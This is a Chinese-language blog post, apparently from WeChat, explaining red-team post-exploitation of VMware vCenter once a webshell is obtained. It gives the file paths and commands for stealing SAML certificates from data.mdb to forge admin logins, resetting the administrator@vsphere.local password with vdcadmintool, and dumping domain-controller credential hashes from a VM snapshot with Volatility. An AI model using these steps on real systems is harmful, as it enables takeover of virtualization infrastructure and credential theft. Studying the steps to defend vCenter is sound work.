> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/wfYdBoxyM4rvRu0QVH6jOw)

0x01 前言
-------

在稍微体量较大的攻防演练中，常会遇到 vCenter，那么利用 nday 或者 1day 拿到了 shell 之后我们又该如何深入利用呢？因为对于 vCenter 这类集群系统，获取该类系统的 shell 没办法把危害最大化。恰好我也在实战环境中遇到了 vCenter，于是在这里做个总结。

0x02 SAML 证书
------------

VMware vCenter 提供自己的 SSO 服务，以便用户可以对所有 VMware 服务使用一组凭据。VMware Directory (vmdir) 服务主要负责 vCenter SSO 服务并存储关键身份验证信息，例如本地 vCenter 用户名和密码哈希以及 SAML 证书。

相对应的 vCenter 中的 **data.mdb** 包含证书，可以在 vCenter 备份中以及具有 root 权限的 VCSA 主机上找到。这些证书以明文形式存储，可用于为任何用户（包括内置管理员）签署任何 SAML 身份验证请求。

```
# Linux:
/storage/db/vmware-vmdir/data.mdb

# Windows:
C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb


```

除了以上这些路径可以获取 data.mdb 文件之外，我们也可以通过 vCenter 的备份文件当中找到 data.mdb 文件。vCenter 备份内有一个名为 lotus_backup.tar.gz 的存档，这里通常存放着我们需要的 data.mdb 文件。

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjJPRW1vvAP7cjAz8hwhW8DEE0ltvdBjCEiaYEDvYxBksiaico2Mib2GcNL4W13SYgDt53MzkMhJCx57w/640?wx_fmt=png)

当我们通过 nday 拿到了一个 Vcenter 的 shell 之后就可以在对应的系统的文件夹里找到相对应的文件。在这里我通过 CVE-2022-22005 拿到了一个 webshell，并且权限为 root。这时候我们可以使用路径 **/storage/db/vmware-vmdir/** 去找到我们的 data.mdb 文件。

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjJPRW1vvAP7cjAz8hwhW8DicHgwY4j3mmSBibhUZyVcrpsE4W89PsrgQBKhL42RLGtwEPibmQfJ5kQQ/640?wx_fmt=png)

我们将它下载下来，并且开始利用脚本工具

```
https://github.com/horizon3ai/vcenter_saml_login

# python3 vcenter_saml_login.py -t 10.102.255.62 -p data.mdb


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjJPRW1vvAP7cjAz8hwhW8DeAhPWd3ho163A7qBUChzoibWbP1jyia8lPChB0N55ZKHiaYvoJTPC0Cyw/640?wx_fmt=png)

这里我们拿到 cookie 之后可以开始写入 cookie 并且登录 vCenter。

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjJPRW1vvAP7cjAz8hwhW8DLfxYjIZKdp79wGxBk1bGnOnH81EBraGSpRFdVDUy3icDHCHtdy1iaiaYw/640?wx_fmt=png)

将 Cookie 写入后，设置 Path 路径为 / ui 后，直接访问，即可成功登录。

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjJPRW1vvAP7cjAz8hwhW8DGibv1AzKRpS5W3BfQWEoBdTcO4slJNxKh6iagtTLbavsiaruDyiaradaRg/640?wx_fmt=png)

0x03 重置 Administrator 密码
------------------------

这是一个危险性较大的一个操作，并且容易被管理员所发现，但是确实是实战当中最方便的一种方法。

我们通过 nday 拿到的 webshell，在冰蝎启动一个虚拟终端。

在重置密码之前我们需要知道它的域，为了在之后重置密码成功后登录 vCenter。

```
/usr/lib/vmware-vmafd/bin/vmafd-cli get-domain-name --server-name localhost


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjJPRW1vvAP7cjAz8hwhW8DlQHwmiazvLPuah5ibAYwoiaLiaicVTdVxdlslqKViciaHRC1ak5wyYBQDJ3Rg/640?wx_fmt=png)

得到域为 **vsphere.local**，我们直接开始重置密码。

```
#Linux 
/usr/lib/vmware-vmdir/bin/vdcadmintool 

#Windows 
C:\Program Files\Vmware\vCenter Server\vmdird\vdcadmintool.exe


```

如果直接使用冰蝎的命令执行功能是无法成功的，我们需要启动一个虚拟终端，进行交互。

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjJPRW1vvAP7cjAz8hwhW8DHZZeDJM5GhYomtzPfnZ9yACa2iadefUN6Pjo3dg26PTj5vnynd8EDEg/640?wx_fmt=png)

我们在这里直接选择 3，并且输入 administrator 以及我们刚才得到的域: vsphere.local。输入 **administrator@vsphere.local** 之后就会重置密码并且给你一个新的密码。

ps: 由于我目前的操作环境为实际的业务环节，不方便演示。

这个时候我们就可以拿新的密码访问 Vcenter 并成功登录

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjJPRW1vvAP7cjAz8hwhW8DTgr3YP95rwZLHjhc2QqAvC6nymcO9Oykepn7cxMiaPrJZdickxfyVOYA/640?wx_fmt=png)

0x04 DC Hash
------------

这里我是推荐直接快照的方法。

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjJPRW1vvAP7cjAz8hwhW8DMXFEiaVTibuQiad0VPeWD4lic5ibib60Diajx2erLFv1wxDZ2IvSwJBzEkic8w/640?wx_fmt=png)

直接 **Take Snapshot** 然后等待快照的完成后点击 Datastores。

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjJPRW1vvAP7cjAz8hwhW8D2Lgbul0V4FoG5CC3fZoWKy6LXwYJEP3JyicJLsPEWicrm1J5rH4dEaiaw/640?wx_fmt=png)

直接点击 **KM-RHDC01-Snapshot232.vmem** 并把它下载下来，有点大。

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjJPRW1vvAP7cjAz8hwhW8D6dppKWGjPbLvg6JkiaLurjQYVjXNvN8gAgH7a87MMCaaQhLRibHQu4bQ/640?wx_fmt=png)

```
# Volatility2.6内存取证工具
https://github.com/volatilityfoundation/volatility

volatility_2.6_win64_standalone.exe -f KM-RHDC01-Snapshot232.vmem imageinfo
volatility_2.6_win64_standalone.exe -f KM-RHDC01-Snapshot232.vmem --profile=Win8SP0x64 hashdump
volatility_2.6_win64_standalone.exe -f KM-RHDC01-Snapshot232.vmem --profile=Win8SP0x64 lsadump


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjJPRW1vvAP7cjAz8hwhW8Dl9L6rtSgOticQG7diaY0RAyKOS17z5mK8xZgo2j4PSrGom6P1TQYv1ow/640?wx_fmt=png)

0x05 结尾
-------

这个我没写全，但基于常规的攻防演练当中这些是必不可少的基础操作。这篇文章也是基于实战所常用的基础向关于 vCenter 后渗透的操作。

承接红蓝对抗、安全众测、安全培训、CTF 代打、CTF 培训、代码审计、渗透测试、应急响应 等等的安全项目，请联系下方微信。

![](https://mmbiz.qpic.cn/mmbiz_jpg/icefLCXrhxfgp6OTRAV6boicrQdeFONewFSSYzuC8LYsM9hOrv3K6qVeUCUgoEZmfReVGJIjL6o9BE6MZAGEO87g/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)